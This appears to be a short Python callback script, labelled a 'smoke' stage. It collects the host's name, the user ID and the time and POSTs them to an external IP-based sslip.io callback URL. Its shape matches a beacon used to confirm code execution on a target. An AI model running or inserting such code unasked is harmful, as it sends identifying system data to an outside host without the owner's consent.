import json,os,time,urllib.request
x={'stage':'smoke','host':os.uname().nodename,'uid':os.getuid(),'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime())}
r=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-p1-smoke-20261106',data=json.dumps(x).encode(),method='POST',headers={'Content-Type':'application/json'})
with urllib.request.urlopen(r,timeout=20) as q:print(q.status,q.read(200).decode())
